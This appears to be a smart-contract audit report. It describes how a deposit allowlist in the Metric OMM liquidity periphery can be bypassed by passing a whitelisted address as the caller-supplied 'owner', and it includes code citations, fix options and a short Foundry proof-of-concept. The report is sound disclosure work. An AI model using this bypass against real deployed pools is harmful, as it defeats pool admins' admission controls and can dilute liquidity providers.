### Title
`DepositAllowlistExtension` Bypassed via Caller-Supplied `owner` in `addLiquidityExactShares` — (`metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

---

### Summary

`DepositAllowlistExtension.beforeAddLiquidity` gates deposits by checking the `owner` (position owner) parameter, not the actual payer/initiator. `MetricOmmPoolLiquidityAdder.addLiquidityExactShares` accepts a caller-supplied `owner` address and validates only that it is non-zero. An unprivileged attacker can supply any already-whitelisted address as `owner`, causing the allowlist check to pass while the attacker's own tokens fund the deposit. The curated pool's admission policy is violated without any privileged access.

---

### Finding Description

`DepositAllowlistExtension.beforeAddLiquidity` ignores the `sender` parameter and gates on `owner`:

```solidity
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
``` [1](#0-0) 

`MetricOmmPool.addLiquidity` passes `msg.sender` as `sender` and the caller-supplied `owner` as `owner` to the extension:

```solidity
_beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
``` [2](#0-1) 

`ExtensionCalling._beforeAddLiquidity` forwards both to the extension verbatim: [3](#0-2) 

`MetricOmmPoolLiquidityAdder.addLiquidityExactShares` (the `owner`-explicit overload) accepts any non-zero `owner` from the caller:

```solidity
function addLiquidityExactShares(
    address pool,
    address owner,   // ← fully caller-controlled
    ...
) external payable override returns (...) {
    _validateOwner(owner);   // only rejects address(0)
    ...
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, ...);
}
``` [4](#0-3) 

`_validateOwner` only rejects `address(0)`: [5](#0-4) 

The same flaw exists in `addLiquidityWeighted(pool, owner, ...)`: [6](#0-5) 

**Call chain producing the bypass:**

1. Attacker (not on allowlist) calls `LiquidityAdder.addLiquidityExactShares(pool, whitelistedAddr, salt, deltas, max0, max1, extData)`.
2. `LiquidityAdder` calls `pool.addLiquidity(whitelistedAddr, salt, deltas, KIND_PAY, extData)`.
3. Pool calls `extension.beforeAddLiquidity(LiquidityAdder, whitelistedAddr, ...)`.
4. Extension evaluates `allowedDepositor[pool][whitelistedAddr]` → `true` → guard passes.
5. Attacker's tokens are pulled via the callback; position is minted under `whitelistedAddr`.

The `sender` field seen by the extension is the `LiquidityAdder` contract address — never the attacker — so no individual-user check on `sender` is possible either. The only actor the extension can meaningfully gate on is `owner`, and that is fully attacker-controlled.

---

### Impact Explanation

The pool admin's deposit allowlist is bypassed by an unprivileged path. Unauthorized liquidity enters a curated pool:

- **Curation failure**: the pool admin's admission policy is violated; parties not on the allowlist can add liquidity.
- **LP dilution / price-impact griefing**: an attacker can deposit at any bin composition, shifting the pool cursor and diluting existing LP positions.
- **Unsolicited positions**: whitelisted addresses receive positions they did not initiate, which may interfere with their own position management (salt collisions, unexpected balances).

This matches the allowed impact gate: *admin-boundary break — factory/oracle role checks are bypassed by an unprivileged path* and *broken core pool functionality causing loss of funds or unusable liquidity flows*.

---

### Likelihood Explanation

- The `addLiquidityExactShares(pool, owner, ...)` overload is a standard public periphery entry point requiring no special role.
- Any whitelisted address is discoverable from `AllowedToDepositSet` events emitted by `setAllowedToDeposit`.
- The attacker only needs token approval on the `LiquidityAdder` and knowledge of one whitelisted address.
- No flash loan, oracle manipulation, or privileged access is required.

---

### Recommendation

**Option A (minimal):** In `MetricOmmPoolLiquidityAdder._validateOwner`, require `owner == msg.sender` so callers can only create positions for themselves:

```solidity
function _validateOwner(address owner) internal view {
    if (owner == address(0)) revert InvalidPositionOwner();
    if (owner != msg.sender) revert InvalidPositionOwner(); // add this
}
```

This eliminates the mismatch between payer and position owner entirely.

**Option B (extension-side):** Change `DepositAllowlistExtension.beforeAddLiquidity` to check `sender` instead of `owner`. This requires pool admins to allowlist the `LiquidityAdder` contract rather than individual users, which is a different (coarser) policy but at least cannot be spoofed by a caller-supplied address.

**Option C (both):** Apply both fixes. Enforce `owner == msg.sender` in the periphery and check `sender` in the extension so that the guard keys on the actual initiating contract, not a caller-supplied identity.

---

### Proof of Concept

```solidity
// Setup: pool with DepositAllowlistExtension; alice is whitelisted, attacker is not.
address alice = makeAddr("alice");
address attacker = makeAddr("attacker");

extension.setAllowedToDeposit(address(pool), alice, true);
// attacker is NOT on the allowlist

// Attacker funds themselves and approves the LiquidityAdder
token0.mint(attacker, 1_000_000);
token1.mint(attacker, 1_000_000);
vm.startPrank(attacker);
token0.approve(address(liquidityAdder), type(uint256).max);
token1.approve(address(liquidityAdder), type(uint256).max);

// Attacker supplies alice as owner — bypasses the allowlist check
LiquidityDelta memory delta = LiquidityDelta({binIdxs: ..., shares: ...});
liquidityAdder.addLiquidityExactShares(
    address(pool),
    alice,          // whitelisted owner — guard passes
    0,              // salt
    delta,
    1_000_000,
    1_000_000,
    ""
);
vm.stopPrank();

// Attacker's tokens are now in the pool under alice's position.
// The DepositAllowlistExtension did not block the unauthorized deposit.
``` [1](#0-0) [4](#0-3) [5](#0-4)

### Citations

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L32-42)
```text
  function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L191-191)
```text
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
```

**File:** metric-core/contracts/ExtensionCalling.sol (L88-99)
```text
  function _beforeAddLiquidity(
    address sender,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_ADD_LIQUIDITY_ORDER,
      abi.encodeCall(IMetricOmmExtensions.beforeAddLiquidity, (sender, owner, salt, deltas, extensionData))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L88-116)
```text
  function addLiquidityWeighted(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata weightDeltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    int8 minimalCurBin,
    uint104 minimalPosition,
    int8 maximalCurBin,
    uint104 maximalPosition,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(weightDeltas);
    _validatePositiveWeights(weightDeltas);
    _validateBinAndBinPosition(pool, minimalCurBin, minimalPosition, maximalCurBin, maximalPosition);

    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L247-249)
```text
  function _validateOwner(address owner) internal pure {
    if (owner == address(0)) revert InvalidPositionOwner();
  }
```
